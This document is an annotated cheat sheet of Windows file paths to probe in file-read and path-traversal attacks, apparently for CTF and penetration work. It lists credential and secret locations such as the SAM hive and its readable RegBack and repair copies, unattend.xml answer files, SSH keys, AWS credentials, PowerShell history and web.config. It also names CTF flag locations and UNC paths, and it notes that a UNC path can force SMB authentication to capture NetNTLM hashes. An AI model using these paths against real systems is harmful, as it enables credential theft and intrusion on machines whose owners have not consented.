# Windows Paths — the read corpus

## The system files — the proof-of-read

```
C:\windows\win.ini                — the classic read-probe
C:\windows\system.ini
C:\boot.ini                       — boot config
C:\windows\system32\drivers\etc\hosts
C:\windows\system32\drivers\etc\networks
C:\windows\system32\drivers\etc\services
C:\windows\system32\drivers\etc\protocol
C:\windows\system32\license.rtf
C:\windows\system32\eula.txt
C:\windows\debug\NetSetup.log
C:\windows\Panther\unattend.xml   — the answer-file creds!
C:\windows\Panther\Unattend.xml
C:\windows\Panther\Unattend\unattend.xml
C:\windows\Panther\autounattend.xml
C:\sysprep\sysprep.inf
C:\sysprep\sysprep.xml
C:\windows\system32\sysprep.inf
C:\windows\system32\sysprep\sysprep.xml
C:\windows\iis6.log
C:\windows\repair\sam
C:\windows\repair\system
C:\windows\repair\software
C:\windows\repair\security
C:\windows\repair\default
C:\windows\ntbtlog.txt
C:\windows\ntds\ntds.dit           — the AD DB (locked usually)
C:\windows\System32\config\SAM     — locked — needs SeBackup
C:\windows\System32\config\SYSTEM
C:\windows\System32\config\SECURITY
C:\windows\System32\config\SOFTWARE
C:\windows\System32\config\DEFAULT
C:\windows\System32\config\RegBack\SAM
C:\windows\System32\config\RegBack\SYSTEM
C:\windows\System32\config\RegBack\SECURITY
C:\windows\System32\config\RegBack\SOFTWARE
C:\windows\System32\config\RegBack\DEFAULT
C:\windows\CSC\v2.0.6\...\*.csv    — offline-files cache
C:\windows\System32\LogFiles\W3SVC1\*.log    — IIS logs
C:\windows\System32\LogFiles\HTTPERR\*.log
C:\inetpub\logs\LogFiles\W3SVC1\*.log
C:\windows\Temp\*.log
```

## The IIS corpus — the web-root secrets

```
C:\inetpub\wwwroot\web.config
C:\inetpub\wwwroot\appsettings.json
C:\inetpub\wwwroot\appsettings.Production.json
C:\inetpub\wwwroot\appsettings.Development.json
C:\inetpub\wwwroot\Global.asax
C:\inetpub\wwwroot\Global.asax.cs
C:\inetpub\wwwroot\packages.config
C:\inetpub\wwwroot\*.csproj
C:\inetpub\wwwroot\bin\*.dll
C:\inetpub\wwwroot\App_Data\*.mdf
C:\inetpub\wwwroot\App_Data\*.ldf
C:\inetpub\wwwroot\App_Data\*.sdf
C:\inetpub\wwwroot\App_Code\*.cs
C:\inetpub\wwwroot\*.config
C:\inetpub\wwwroot\.env
C:\inetpub\wwwroot\index.aspx
C:\inetpub\wwwroot\default.aspx
C:\inetpub\wwwroot\iisstart.htm
C:\inetpub\adminscripts\
C:\inetpub\wwwroot\aspnet_client\
C:\windows\System32\inetsrv\config\applicationHost.config
C:\windows\System32\inetsrv\config\administration.config
C:\windows\System32\inetsrv\config\redirection.config
C:\windows\System32\inetsrv\config\schema\*
C:\windows\Microsoft.NET\Framework*\v*\CONFIG\machine.config
C:\windows\Microsoft.NET\Framework*\v*\CONFIG\web.config
C:\windows\Microsoft.NET\Framework64\v*\CONFIG\machine.config
C:\windows\Microsoft.NET\Framework64\v*\CONFIG\web.config
```

## The user-profile corpus

```
C:\Users\Administrator\Desktop\flag.txt
C:\Users\Administrator\Desktop\
C:\Users\Administrator\Documents\
C:\Users\Administrator\Downloads\
C:\Users\Administrator\.ssh\id_rsa
C:\Users\Administrator\.ssh\id_ed25519
C:\Users\Administrator\.aws\credentials
C:\Users\Administrator\.kube\config
C:\Users\Administrator\.docker\config.json
C:\Users\Administrator\.azure\
C:\Users\Administrator\.gitconfig
C:\Users\Administrator\.git-credentials
C:\Users\Administrator\.aws\
C:\Users\Administrator\NTUSER.DAT          — the user registry hive
C:\Users\Administrator\AppData\Roaming\
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt   — the PS history!
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\
C:\Users\Administrator\AppData\Local\
C:\Users\Administrator\AppData\Local\Microsoft\Windows\UsrClass.dat
C:\Users\Administrator\AppData\Local\Microsoft\Credentials\
C:\Users\Administrator\AppData\Local\Microsoft\Protect\
C:\Users\Administrator\AppData\Roaming\Microsoft\Credentials\
C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\
C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\
C:\Users\Administrator\AppData\Roaming\FileZilla\recentservers.xml
C:\Users\Administrator\AppData\Roaming\FileZilla\sitemanager.xml
C:\Users\*\Desktop\flag.txt
C:\Users\*\Documents\
C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
C:\Users\Public\Desktop\
C:\Users\Public\Documents\
C:\Users\Default\
C:\Users\Default\NTUSER.DAT
C:\Users\Default User\
C:\Users\All Users\
```

`ConsoleHost_history.txt` — the PowerShell history — the "the flag was
typed once" corpus on Windows.

## The XAMPP/WAMP/Winginx corpus — the dev-stack secrets

```
C:\xampp\php\php.ini
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\conf\extra\httpd-vhosts.conf
C:\xampp\htdocs\config.php
C:\xampp\htdocs\index.php
C:\xampp\htdocs\.env
C:\xampp\mysql\bin\my.ini
C:\xampp\mysql\data\mysql\user.frm
C:\xampp\phpMyAdmin\config.inc.php
C:\xampp\sendmail\sendmail.ini
C:\xampp\webdav\
C:\xampp\tomcat\conf\server.xml
C:\xampp\tomcat\conf\tomcat-users.xml
C:\wamp\www\config.php
C:\wamp\www\.env
C:\wamp64\www\config.php
C:\wamp64\www\.env
C:\wamp\bin\apache\*\conf\httpd.conf
C:\wamp\bin\mysql\*\my.ini
C:\wamp\bin\php\*\php.ini
C:\winginx\...
C:\easyphp\...
C:\uniform\...
C:\php\php.ini
C:\phpMyAdmin\config.inc.php
```

## The Program Files/ProgramData corpus

```
C:\Program Files\...\*.config
C:\Program Files\...\*.ini
C:\Program Files\...\*.xml
C:\Program Files\...\app.config
C:\Program Files\...\web.config
C:\Program Files\MySQL\MySQL Server*\my.ini
C:\Program Files\MySQL\MySQL Server*\data\mysql\user.frm
C:\Program Files\PostgreSQL\*\data\postgresql.conf
C:\Program Files\PostgreSQL\*\data\pg_hba.conf
C:\Program Files\Apache*\conf\httpd.conf
C:\Program Files\Apache*\conf\extra\httpd-vhosts.conf
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\Microsoft SQL Server\...
C:\Program Files\MongoDB\Server\*\bin\mongod.cfg
C:\Program Files\Redis\redis.windows.conf
C:\Program Files\Elasticsearch\...\elasticsearch.yml
C:\Program Files (x86)\...
C:\ProgramData\MySQL\MySQL Server*\my.ini
C:\ProgramData\MySQL\MySQL Server*\data\mysql\user.frm
C:\ProgramData\PostgreSQL\*\data\postgresql.conf
C:\ProgramData\...
C:\ProgramData\chocolatey\config\*
C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\
```

## The registry-hive corpus — the locked-registry workaround

```
C:\windows\System32\config\SAM           — locked — read via SeBackup or shadow-copy
C:\windows\System32\config\RegBack\SAM   — the backup hive — readable!
C:\windows\System32\config\RegBack\SYSTEM
C:\windows\System32\config\RegBack\SECURITY
C:\windows\System32\config\RegBack\SOFTWARE
C:\windows\System32\config\RegBack\DEFAULT
C:\windows\repair\sam                     — the repair-hive — readable
C:\windows\repair\system
C:\windows\repair\software
C:\windows\repair\security
C:\windows\repair\default
```

`RegBack\`/`repair\` are the readable copies of the locked hives — the
SAM-hive-read without a shadow-copy.

## The temp/log corpus

```
C:\windows\Temp\*.log
C:\windows\Temp\*.txt
C:\windows\Temp\*.tmp
C:\windows\debug\
C:\windows\Logs\
C:\windows\Logs\CBS\
C:\windows\Logs\WindowsUpdate\
C:\windows\Logs\DISM\
C:\inetpub\logs\LogFiles\W3SVC1\*.log
C:\inetpub\logs\LogFiles\FTPSVC*\*.log
C:\windows\System32\LogFiles\
C:\windows\Prefetch\*.pf        — prefetch — execution trace
C:\windows\Minidump\*.dmp        — crash dumps
C:\memory.dmp                    — the full-memory dump!
```

## The flag-file corpus — the CTF defaults

```
C:\flag.txt
C:\flag{...}.txt
C:\flags.txt
C:\Users\Administrator\Desktop\flag.txt
C:\Users\*\Desktop\flag.txt
C:\inetpub\wwwroot\flag.txt
C:\inetpub\flag.txt
C:\xampp\htdocs\flag.txt
C:\wamp\www\flag.txt
```

## The UNC/SMB corpus — the network-share read

```
file://\\127.0.0.1\c$\windows\win.ini
file://\\?\c:\windows\win.ini
file://\\localhost\c$\windows\win.ini
file://\\127.0.0.1\ADMIN$\...
\\127.0.0.1\c$\windows\win.ini
\\?\c:\windows\win.ini
\\.\c:\windows\win.ini
\\.\pipe\...
```

The UNC form — `\\` — the NTLM-leak channel — `\\YOU\share\x` forces
SMB auth — a NetNTLM capture on Windows targets.
